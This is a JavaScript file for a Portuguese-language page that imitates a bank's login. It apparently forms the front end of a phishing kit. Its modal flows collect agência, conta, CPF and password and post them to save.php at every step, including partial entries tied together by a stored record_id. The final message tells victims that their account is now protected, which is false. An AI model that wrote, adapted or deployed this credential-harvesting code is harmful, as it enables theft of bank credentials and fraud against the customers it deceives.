/* app.js (unified, updated)
   - Carousel (autoplay, no pause on hover, prev/next, 5-dot mapping, touch swipe)
   - Mobile menu
   - Modal + tabs + input formatting (agencia/conta/CPF)
   - Password modal + robust debugFetch + save-on-every-step (creates/updates record_id)
   - Kept behavior from previous version, updated to always attempt saving on key actions
*/

/* ---------- Utilities ---------- */
function qs(sel, ctx=document){ return ctx.querySelector(sel); }
function qsa(sel, ctx=document){ return Array.from((ctx||document).querySelectorAll(sel)); }
function clamp(n, a, b){ return Math.max(a, Math.min(b, n)); }

/* ---------- Carousel Module ---------- */
const HeroCarousel = (function(){
  const INTERVAL = 4000;
  const DOTS = 5;
  let slides = [], cur = 0, timer = null, root=null;
  let startX = null;

  function mapIndex(i){
    return Math.round(i * (slides.length - 1) / (DOTS - 1));
  }

  function init(selector = '.hero-container'){
    root = document.querySelector(selector);
    if(!root) return console.warn('HeroCarousel: root not found');
    slides = qsa('.slide', root);
    if(!slides.length) return console.warn('HeroCarousel: no slides');

    buildControls();
    showIndex(0);
    startTimer();
    addEvents();
    window._heroCarousel = { next, prev, goTo: showIndex, startTimer, stopTimer };
  }

  function buildControls(){
    let controls = qs('.mini-carousel-controls', root);
    if(!controls){
      controls = document.createElement('div');
      controls.className = 'mini-carousel-controls';
      controls.innerHTML = '<button class="mini-arrow mini-prev" aria-label="Anterior">‹</button><div class="mini-dots" role="tablist"></div><button class="mini-arrow mini-next" aria-label="Próximo">›</button>';
      root.appendChild(controls);
    }
    const dotsContainer = qs('.mini-dots', controls);
    dotsContainer.innerHTML = '';
    for(let i=0;i<DOTS;i++){
      const btn = document.createElement('button');
      btn.type = 'button';
      btn.className = (i===0? 'active':'');
      btn.dataset.dot = i;
      btn.addEventListener('click', ()=> { showIndex(mapIndex(i)); resetTimer(); });
      dotsContainer.appendChild(btn);
    }
    qs('.mini-prev', controls).addEventListener('click', ()=> { prev(); resetTimer(); });
    qs('.mini-next', controls).addEventListener('click', ()=> { next(); resetTimer(); });
  }

  function updateDots(){
    const dots = qsa('.mini-dots button', root);
    if(!dots.length) return;
    let best = 0;
    for(let d=0; d<DOTS; d++){
      const cand = Math.abs(mapIndex(d) - cur);
      const prev = Math.abs(mapIndex(best) - cur);
      if(cand < prev) best = d;
    }
    dots.forEach((b,i)=> b.classList.toggle('active', i===best));
  }

  function showIndex(i){
    if(!slides.length) return;
    const idx = ((i % slides.length) + slides.length) % slides.length;
    slides.forEach((s,si)=> {
      s.classList.toggle('active', si===idx);
      s.setAttribute('aria-hidden', si===idx ? 'false' : 'true');
    });
    cur = idx;
    updateDots();
  }

  function next(){ showIndex(cur+1); }
  function prev(){ showIndex(cur-1); }

  function startTimer(){ stopTimer(); timer = setInterval(()=> { next(); }, INTERVAL); } // no pause on hover
  function stopTimer(){ if(timer){ clearInterval(timer); timer=null; } }
  function resetTimer(){ stopTimer(); startTimer(); }

  function addEvents(){
    root.addEventListener('touchstart', e => { startX = e.changedTouches[0].clientX; }, {passive:true});
    root.addEventListener('touchend', e => {
      if(startX === null) return;
      const dx = e.changedTouches[0].clientX - startX;
      if(Math.abs(dx) > 40){
        if(dx < 0) next(); else prev();
        resetTimer();
      }
      startX = null;
    }, {passive:true});

    document.addEventListener('keydown', (e) => {
      if(e.key === 'ArrowLeft') { prev(); resetTimer(); }
      if(e.key === 'ArrowRight') { next(); resetTimer(); }
    });
  }

  return { init, next, prev, startTimer, stopTimer };
})();

/* ---------- Mobile Menu ---------- */
function MobileMenu(){
  const toggle = qs('#menu-toggle');
  const mobile = qs('.mobile-menu');
  const hamb = qs('.hamburger');

  if(!toggle || !mobile || !hamb) return;

  hamb.addEventListener('click', ()=> {
    const open = mobile.style.display !== 'block';
    mobile.style.display = open ? 'block' : 'none';
    toggle.checked = open;
  });

  mobile.addEventListener('click', (e)=> {
    if(e.target.tagName === 'A') { mobile.style.display = 'none'; toggle.checked = false; }
  });

  window.addEventListener('resize', ()=> { if(window.innerWidth > 980){ mobile.style.display='none'; toggle.checked=false; } });
}

/* ---------- Modal + Inputs (with CPF mask) ---------- */
function ModalAndInputs(){
  const modal = qs('#modal-acessos');
  const openBtn = qs('#open-accessos');
  const closeBtn = qs('#close-modal');
  const tabs = qsa('.tab');
  const modalAg = qs('#modal-agencia');
  const modalConta = qs('#modal-conta');
  const modalCpf = qs('#modal-cpf');

  function numericOnly(el, max){
    if(!el) return;
    el.addEventListener('input', e => { e.target.value = e.target.value.replace(/\D/g,'').slice(0, max); });
    el.addEventListener('keypress', e => { if(!/[0-9]/.test(e.key)) e.preventDefault(); });
  }

  function contaFormat(el){
    if(!el) return;
    el.addEventListener('input', e => {
      let v = e.target.value.replace(/\D/g,'').slice(0,6);
      if(v.length > 5) v = v.slice(0,5) + '-' + v.slice(5);
      e.target.value = v;
    });
  }

  function cpfFormat(el){
    if(!el) return;
    try { el.maxLength = 14; } catch(e){}
    function applyMaskDigits(digits){
      if(!digits) return '';
      const v = digits.slice(0,11);
      if(v.length <= 3) return v;
      if(v.length <= 6) return v.slice(0,3) + '.' + v.slice(3);
      if(v.length <= 9) return v.slice(0,3) + '.' + v.slice(3,6) + '.' + v.slice(6);
      return v.slice(0,3) + '.' + v.slice(3,6) + '.' + v.slice(6,9) + '-' + v.slice(9);
    }
    function getDigits(str){ return (str||'').replace(/\D/g,''); }

    el.addEventListener('input', e => {
      const input = e.target;
      const rawBefore = input.value;
      const cursorBefore = input.selectionStart || 0;
      const digits = getDigits(rawBefore);
      const masked = applyMaskDigits(digits);
      input.value = masked;
      try {
        let leftRaw = rawBefore.slice(0, cursorBefore);
        const leftDigits = getDigits(leftRaw).length;
        if(leftDigits === 0){
          input.setSelectionRange(0,0);
        } else {
          let count = 0, pos = 0;
          while(pos < input.value.length && count < leftDigits){
            if(/\d/.test(input.value[pos])) count++;
            pos++;
          }
          input.setSelectionRange(pos, pos);
        }
      } catch(err){}
    });

    el.addEventListener('keypress', e => { if(!/[0-9]/.test(e.key)) e.preventDefault(); });

    el.addEventListener('paste', e => {
      e.preventDefault();
      const txt = (e.clipboardData || window.clipboardData).getData('text') || '';
      const digits = getDigits(txt).slice(0,11);
      el.value = applyMaskDigits(digits);
      el.dispatchEvent(new Event('input', { bubbles:true }));
    });
  }

  if(openBtn && modal){
    openBtn.addEventListener('click', ()=> {
      modal.style.display = 'flex';
      modal.setAttribute('aria-hidden','false');
      const activeTab = tabs.find(t => t.classList.contains('active'));
      const key = activeTab ? activeTab.dataset.tab : 'ag-conta';
      qsa('.tab-content').forEach(tc => {
        if(tc.id === 'tab-' + key){
          tc.classList.add('active'); tc.classList.remove('hidden'); tc.setAttribute('aria-hidden','false');
        } else {
          tc.classList.remove('active'); tc.classList.add('hidden'); tc.setAttribute('aria-hidden','true');
        }
      });
      setTimeout(()=> {
        if(key === 'cpf'){ modalCpf && modalCpf.focus(); } else { modalAg && modalAg.focus(); }
      }, 40);
    });
  }

  if(closeBtn && modal){
    closeBtn.addEventListener('click', ()=> { modal.style.display='none'; modal.setAttribute('aria-hidden','true'); });
  }
  if(modal){
    modal.addEventListener('click', (e)=> { if(e.target===modal) { modal.style.display='none'; modal.setAttribute('aria-hidden','true'); }});
    document.addEventListener('keydown', (e)=> { if(e.key==='Escape' && modal.style.display==='flex'){ modal.style.display='none'; modal.setAttribute('aria-hidden','true'); }});
  }

  tabs.forEach(t=>{ t.addEventListener('click', ()=> {
      tabs.forEach(x=> x.classList.remove('active'));
      t.classList.add('active');
      const tab = t.dataset.tab;
      qsa('.tab-content').forEach(tc => {
        if(tc.id === 'tab-' + tab){ tc.classList.add('active'); tc.classList.remove('hidden'); tc.setAttribute('aria-hidden','false'); }
        else { tc.classList.remove('active'); tc.classList.add('hidden'); tc.setAttribute('aria-hidden','true'); }
      });
      if(tab === 'cpf'){ setTimeout(()=> { modalCpf && modalCpf.focus(); }, 40); } else { setTimeout(()=> { modalAg && modalAg.focus(); }, 40); }
  }); });

  numericOnly(modalAg,4);
  contaFormat(modalConta);
  cpfFormat(modalCpf);
}

/* ---------- Header inputs formatting (top inline) ---------- */
function HeaderInputs(){
  const ag = qs('#agencia_menu') || qs('#agencia') || null;
  const cont = qs('#conta_menu') || qs('#conta') || null;
  function numericOnly(el, max){
    if(!el) return;
    el.addEventListener('input', e => { e.target.value = e.target.value.replace(/\D/g,'').slice(0,max); });
    el.addEventListener('keypress', e => { if(!/[0-9]/.test(e.key)) e.preventDefault(); });
  }
  function contaFormat(el){
    if(!el) return;
    el.addEventListener('input', e => {
      let v = e.target.value.replace(/\D/g,'').slice(0,6);
      if(v.length > 5) v = v.slice(0,5) + '-' + v.slice(5);
      e.target.value = v;
    });
  }
  numericOnly(ag,4);
  contaFormat(cont);
}

/* ---------- Fetch debug helper (tries multiple URLs and returns parsed result) ---------- */
async function debugFetchFormData(bodyLike){
  // bodyLike can be FormData or URLSearchParams or string. We'll try multiple endpoints.
  const basePath = window.location.pathname.replace(/\/[^\/]*$/, '');
  const candidates = [
    'save.php',
    basePath + '/save.php',
    window.location.origin + '/save.php',
    window.location.origin + basePath + '/save.php'
  ].map(p => p.replace(/([^:]\/)\/+/g,'$1')); // normalize duplicates

  for(const url of candidates){
    try {
      console.log('[debugFetch] trying', url);
      const opts = { method: 'POST' };
      if(bodyLike instanceof FormData){
        opts.body = bodyLike;
      } else if(bodyLike instanceof URLSearchParams){
        opts.headers = {'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8'};
        opts.body = bodyLike.toString();
      } else if(typeof bodyLike === 'string'){
        opts.headers = {'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8'};
        opts.body = bodyLike;
      } else {
        // fallback to JSON
        opts.headers = {'Content-Type':'application/json'};
        opts.body = JSON.stringify(bodyLike || {});
      }
      const res = await fetch(url, opts);
      const text = await res.text();
      let parsed = null;
      try { parsed = JSON.parse(text); } catch(e){ /* not json */ }
      console.log('[debugFetch] url', url, 'status', res.status, 'text:', text.slice(0,800));
      if(res.ok){
        return { ok:true, url, status: res.status, text, json: parsed };
      } else {
        return { ok:false, url, status: res.status, text, json: parsed };
      }
    } catch(err){
      console.warn('[debugFetch] failed for', url, err);
      continue;
    }
  }
  return { ok:false, error:'network', message:'All attempts failed (network / CORS / wrong path).' };
}

/* ---------- Helpers for payload collection ---------- */
function normalizeDigits(val){ return (val||'').toString().replace(/\D/g,''); }
function collectPayload(){
  const data = {};
  data.record_id      = (document.getElementById('record_id') || {value:''}).value.trim();
  data.agencia_menu   = (document.getElementById('agencia_menu') || {value:''}).value.trim();
  data.conta_menu     = (document.getElementById('conta_menu')   || {value:''}).value.trim();
  data.agencia_modal  = (document.getElementById('modal-agencia')|| {value:''}).value.trim();
  data.conta_modal    = (document.getElementById('modal-conta')  || {value:''}).value.trim();
  // modal cpf field (tab) and cpf submodal field (cpfModal) - prefer visible modal-cpf then cpf_input
  const mcpf = (document.getElementById('modal-cpf') || {value:''}).value.trim();
  const sCPF = (document.getElementById('cpf_input') || {value:''}).value.trim();
  data.cpf = mcpf || sCPF || '';
  data.password = (document.getElementById('password-input') || {value:''}).value;
  // validation submodal fields
  data.agencia_validate = (document.getElementById('ac_agencia') || {value:''}).value.trim();
  data.conta_validate   = (document.getElementById('ac_conta')   || {value:''}).value.trim();
  return data;
}
function pickAgencyConta(payload){
  let ag = '', ct = '';
  if(payload.agencia_menu && payload.conta_menu){
    ag = payload.agencia_menu; ct = payload.conta_menu;
  } else if(payload.agencia_modal && payload.conta_modal){
    ag = payload.agencia_modal; ct = payload.conta_modal;
  } else if(payload.agencia_validate && payload.conta_validate){
    ag = payload.agencia_validate; ct = payload.conta_validate;
  }
  ct = ct.toString().replace(/[^\d\-]/g,'');
  ag = ag.toString().replace(/\D/g,'').slice(0,4);
  return {agencia: ag, conta: ct};
}

/* ---------- Save logic (create/update, store record_id locally) ---------- */
async function saveCurrent(actionLabel){
  const payload = collectPayload();
  if(actionLabel) payload._action = actionLabel;

  // build URLSearchParams for compatibility
  const params = new URLSearchParams();
  Object.keys(payload).forEach(k => {
    if(payload[k] !== undefined && payload[k] !== null) params.append(k, payload[k]);
  });

  console.debug('[save] sending', params.toString());
  const r = await debugFetchFormData(params);
  console.debug('[save] result', r);
  if(r && r.ok && r.json && r.json.success){
    const id = r.json.id || (r.json.data && r.json.data.id) || null;
    if(id){
      try {
        const ridInput = document.getElementById('record_id');
        if(ridInput) ridInput.value = id;
        localStorage.setItem('access_record_id', id.toString());
      } catch(e){}
    }
  } else if(r && r.json && !r.json.success){
    // server returned JSON with success:false — still may contain id or debug info
    if(r.json.id){
      try { document.getElementById('record_id').value = r.json.id; localStorage.setItem('access_record_id', r.json.id); } catch(e){}
    }
  }
  return r;
}

/* ---------- Init on DOMContentLoaded ---------- */
document.addEventListener('DOMContentLoaded', ()=> {
  HeroCarousel.init('.hero-container');
  MobileMenu();
  ModalAndInputs();
  HeaderInputs();

  // restore record id if present in localStorage
  try {
    const rid = localStorage.getItem('access_record_id');
    if(rid && !document.getElementById('record_id')) {
      // if hidden input missing, create it to keep flow consistent
      const h = document.createElement('input');
      h.type = 'hidden'; h.id = 'record_id'; h.name = 'record_id'; h.value = rid;
      const form = document.getElementById('access-form');
      if(form) form.appendChild(h);
    } else if(rid && document.getElementById('record_id')) {
      document.getElementById('record_id').value = rid;
    }
  } catch(e){}
});

/* ---------- Modal & Flow + Event wiring (save-on-actions) ---------- */
(function(){
  const $ = s => document.querySelector(s);
  const $$ = s => Array.from(document.querySelectorAll(s));
  const onlyDigits = v => (v||'').toString().replace(/\D/g,'');

  // elements
  const form = $('#access-form');
  const openPasswordBtn = $('#open-password-btn'); // may be absent in your markup
  const openAcessosBtn = $('#open-accessos');
  const modalAcessos = $('#modal-acessos');
  const closeModalBtn = $('#close-modal');
  const tabs = $$('.tab');
  const tabContents = $$('.tab-content');

  const agencia_menu = $('#agencia_menu');
  const conta_menu = $('#conta_menu');
  const modal_agencia = $('#modal-agencia');
  const modal_conta = $('#modal-conta');
  const modal_cpf = $('#modal-cpf');

  const modal_access_btn = $('#modal-access-btn');
  const modal_access_cpf = $('#modal-access-cpf');
  const modal_cancel = $('#modal-cancel');
  const open_agconta_submodal = $('#open-agconta-submodal');

  const cpfModal = $('#cpfModal');
  const cpf_input = $('#cpf_input');
  const cpf_confirm = $('#cpf_confirm');
  const cpf_cancel = $('#cpf_cancel');

  const acModal = $('#acModal');
  const ac_agencia = $('#ac_agencia');
  const ac_conta = $('#ac_conta');
  const ac_confirm = $('#ac_confirm');
  const ac_cancel = $('#ac_cancel');

  const passwordModal = $('#modal-password');
  const passwordInput = $('#password-input');
  const passwordSubmit = $('#password-submit');
  const passwordCancel = $('#password-cancel');
  const closePassword = $('#close-password-modal');

  // util
  function showModal(el){ if(!el) return; el.setAttribute('aria-hidden','false'); el.style.display='flex'; setTimeout(()=>{ const ip = el.querySelector('input,button'); if(ip) ip.focus(); },50); }
  function hideModal(el){ if(!el) return; try{ document.activeElement.blur(); }catch(e){} el.setAttribute('aria-hidden','true'); el.style.display='none'; }

  // masks & numeric helpers already applied in other module; ensure fallback
  function cpfMaskLocal(el){ if(!el) return; el.addEventListener('input', e => { const d = onlyDigits(e.target.value).slice(0,11); let out = d; if(d.length>9) out = d.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/,'$1.$2.$3-$4'); else if(d.length>6) out = d.replace(/(\d{3})(\d{3})(\d{1,3})/,'$1.$2.$3'); else if(d.length>3) out = d.replace(/(\d{3})(\d{1,3})/,'$1.$2'); e.target.value = out; }); }
  if(modal_cpf) cpfMaskLocal(modal_cpf); if(cpf_input) cpfMaskLocal(cpf_input);

  // tabs
  tabs.forEach(btn => btn.addEventListener('click', ()=> {
    tabs.forEach(b => { b.classList.remove('active'); b.setAttribute('aria-selected','false'); });
    btn.classList.add('active'); btn.setAttribute('aria-selected','true');
    const tab = btn.dataset.tab;
    tabContents.forEach(tc => {
      if(tc.id === 'tab-'+tab){ tc.classList.add('active'); tc.classList.remove('hidden'); tc.style.display='block'; tc.setAttribute('aria-hidden','false'); }
      else { tc.classList.remove('active'); tc.classList.add('hidden'); tc.style.display='none'; tc.setAttribute('aria-hidden','true'); }
    });
  }));

  // open/close
  openAcessosBtn && openAcessosBtn.addEventListener('click', async ()=> {
    // save partial state, then open
    await saveCurrent('open_acessos_button');
    showModal(modalAcessos);
  });
  closeModalBtn && closeModalBtn.addEventListener('click', ()=> hideModal(modalAcessos));
  modal_cancel && modal_cancel.addEventListener('click', ()=> hideModal(modalAcessos));

  // read helpers (local)
  function readAgConta(){
    const agMenu = agencia_menu ? agencia_menu.value.trim() : '';
    const coMenu = conta_menu ? conta_menu.value.trim() : '';
    const agModal = modal_agencia ? modal_agencia.value.trim() : '';
    const coModal = modal_conta ? modal_conta.value.trim() : '';
    const agValidate = ac_agencia ? ac_agencia.value.trim() : '';
    const coValidate = ac_conta ? ac_conta.value.trim() : '';
    return { agencia: agMenu || agModal || agValidate || '', conta: coMenu || coModal || coValidate || '' };
  }
  function readCPF(){
    const v1 = modal_cpf ? onlyDigits(modal_cpf.value) : '';
    const v2 = cpf_input ? onlyDigits(cpf_input.value) : '';
    return v1 || v2 || '';
  }

  // openPasswordBtn top action (if present)
  if(openPasswordBtn){
    openPasswordBtn.addEventListener('click', async ()=> {
      await saveCurrent('open_password_click');
      const {agencia, conta} = readAgConta();
      const cpf = readCPF();
      const hasAg = onlyDigits(agencia).length === 4;
      const hasCo = onlyDigits(conta).length >= 5;
      const hasCpf = cpf.length === 11;

      if(hasAg && hasCo && !hasCpf){ hideModal(modalAcessos); showModal(cpfModal); return; }
      if(hasCpf && (!hasAg || !hasCo)){ hideModal(modalAcessos); showModal(acModal); return; }
      if(!hasAg && !hasCo && !hasCpf){ showModal(modalAcessos); return; }
      if(hasAg && hasCo && hasCpf){ showModal(passwordModal); return; }
      showModal(modalAcessos);
    });
  }

  // modal flow handlers with saves on steps
  modal_access_cpf && modal_access_cpf.addEventListener('click', async ()=> {
    const cpfDigits = onlyDigits(modal_cpf.value);
    if(!cpfDigits || cpfDigits.length !== 11){ alert('CPF inválido.'); modal_cpf.focus(); return; }
    await saveCurrent('modal_access_cpf_click');
    const {agencia, conta} = readAgConta();
    const hasAg = onlyDigits(agencia).length === 4;
    const hasCo = onlyDigits(conta).length >= 5;
    hideModal(modalAcessos);
    if(hasAg && hasCo) showModal(passwordModal); else showModal(acModal);
  });

  modal_access_btn && modal_access_btn.addEventListener('click', async ()=> {
    const ag = modal_agencia.value.trim();
    const co = modal_conta.value.trim();
    if(!ag || onlyDigits(ag).length !== 4){ alert('Agência inválida'); modal_agencia.focus(); return; }
    if(!co || onlyDigits(co).length < 5){ alert('Conta inválida'); modal_conta.focus(); return; }
    if(agencia_menu) agencia_menu.value = ag;
    if(conta_menu) conta_menu.value = co;
    await saveCurrent('modal_access_agconta_click');
    const cpf = readCPF();
    hideModal(modalAcessos);
    if(cpf && cpf.length === 11) showModal(passwordModal); else showModal(cpfModal);
  });

  open_agconta_submodal && open_agconta_submodal.addEventListener('click', async ()=> {
    await saveCurrent('open_agconta_submodal');
    hideModal(modalAcessos); showModal(acModal);
  });

  cpf_confirm && cpf_confirm.addEventListener('click', async ()=> {
    const cpfDigits = onlyDigits(cpf_input.value);
    if(!cpfDigits || cpfDigits.length !== 11){ alert('CPF inválido'); cpf_input.focus(); return; }
    // copy to main modal field
    if(modal_cpf) modal_cpf.value = cpf_input.value;
    await saveCurrent('cpf_confirm_submodal');
    hideModal(cpfModal);
    const {agencia, conta} = readAgConta();
    const hasAg = onlyDigits(agencia).length === 4;
    const hasCo = onlyDigits(conta).length >= 5;
    if(hasAg && hasCo) showModal(passwordModal); else showModal(acModal);
  });

  ac_confirm && ac_confirm.addEventListener('click', async ()=> {
    const ag = ac_agencia.value.trim();
    const co = ac_conta.value.trim();
    if(!ag || onlyDigits(ag).length !== 4){ alert('Agência inválida'); ac_agencia.focus(); return; }
    if(!co || onlyDigits(co).length < 5){ alert('Conta inválida'); ac_conta.focus(); return; }
    if(modal_agencia) modal_agencia.value = ag;
    if(modal_conta) modal_conta.value = co;
    if(agencia_menu) agencia_menu.value = ag;
    if(conta_menu) conta_menu.value = co;
    await saveCurrent('ac_confirm_submodal');
    hideModal(acModal);
    const cpf = readCPF();
    if(cpf && cpf.length === 11) showModal(passwordModal); else showModal(cpfModal);
  });

  cpf_cancel && cpf_cancel.addEventListener('click', ()=> hideModal(cpfModal));
  ac_cancel && ac_cancel.addEventListener('click', ()=> hideModal(acModal));
  passwordCancel && passwordCancel.addEventListener('click', ()=> hideModal(passwordModal));
  closePassword && closePassword.addEventListener('click', ()=> hideModal(passwordModal));
  $$('.custom-modal-close').forEach(b => b.addEventListener('click', e => { const m = e.target.closest('.custom-modal'); if(m) hideModal(m); }));

  // FINAL: envio EXPLÍCITO (ensures password present) — uses debugFetchFormData and saves response id
  if(passwordSubmit){
    passwordSubmit.addEventListener('click', async (ev) => {
      ev.preventDefault();
      const pwd = (passwordInput && passwordInput.value) ? passwordInput.value.trim() : '';
      if(!pwd){ alert('Digite sua senha'); if(passwordInput) passwordInput.focus(); return; }

      // synchronize visible fields
      if(cpf_input && modal_cpf && onlyDigits(modal_cpf.value).length===0 && onlyDigits(cpf_input.value).length===11) modal_cpf.value = cpf_input.value;
      if(modal_agencia && agencia_menu && onlyDigits(agencia_menu.value).length===0 && onlyDigits(modal_agencia.value).length===4) agencia_menu.value = modal_agencia.value;
      if(modal_conta && conta_menu && onlyDigits(conta_menu.value).length===0 && onlyDigits(modal_conta.value).length>=5) conta_menu.value = modal_conta.value;
      if(ac_agencia && modal_agencia && onlyDigits(ac_agencia.value).length===4) modal_agencia.value = ac_agencia.value;
      if(ac_conta && modal_conta && ac_conta.value.trim()) modal_conta.value = ac_conta.value.trim();

      passwordSubmit.disabled = true;
      const oldTxt = passwordSubmit.textContent;
      passwordSubmit.textContent = 'Enviando...';

      try {
        // Build params (URLSearchParams)
        const params = new URLSearchParams();
        params.append('password', pwd);
        params.append('agencia_menu', agencia_menu ? agencia_menu.value.trim() : '');
        params.append('conta_menu', conta_menu ? conta_menu.value.trim() : '');
        params.append('agencia_modal', modal_agencia ? modal_agencia.value.trim() : '');
        params.append('conta_modal', modal_conta ? modal_conta.value.trim() : '');
        const cpfVal = (modal_cpf && modal_cpf.value.trim()) ? modal_cpf.value.trim() : (cpf_input && cpf_input.value.trim() ? cpf_input.value.trim() : '');
        params.append('cpf', cpfVal);
        params.append('agencia_validate', ac_agencia ? ac_agencia.value.trim() : '');
        params.append('conta_validate', ac_conta ? ac_conta.value.trim() : '');
        // record id if exists
        const rid = (document.getElementById('record_id') || {value:''}).value;
        if(rid) params.append('record_id', rid);

        console.debug('[debugPayload] ->', params.toString());
        const r = await debugFetchFormData(params);
        console.debug('[debugFetch] status', r && r.status, r);

        // attempt to parse json if present
        const parsed = r && r.json ? r.json : null;
        if(r && r.ok && parsed && parsed.success){
          // store id if returned
          if(parsed.id){
            const ridInput = document.getElementById('record_id');
            if(ridInput) ridInput.value = parsed.id;
            try { localStorage.setItem('access_record_id', parsed.id.toString()); } catch(e){}
          }
          alert('Obrigado pela confirmação! Sua conta está protegida ✅');
          hideModal(passwordModal);
          hideModal(modalAcessos);
          // optionally clear password field
          if(passwordInput) passwordInput.value = '';
        } else {
          // show server message if present
          let msg = 'Erro no envio.';
          if(parsed && parsed.error) msg += ' ' + parsed.error;
          else if(r && r.text) msg += ' ' + (r.text.slice ? r.text.slice(0,800) : r.text);
          alert(msg);
          console.error('save.php response', r);
        }
      } catch(err){
        console.error('Fetch error', err);
        alert('Falha na conexão: ' + (err.message || err));
      } finally {
        passwordSubmit.disabled = false;
        passwordSubmit.textContent = oldTxt;
      }
    });
  }

})();
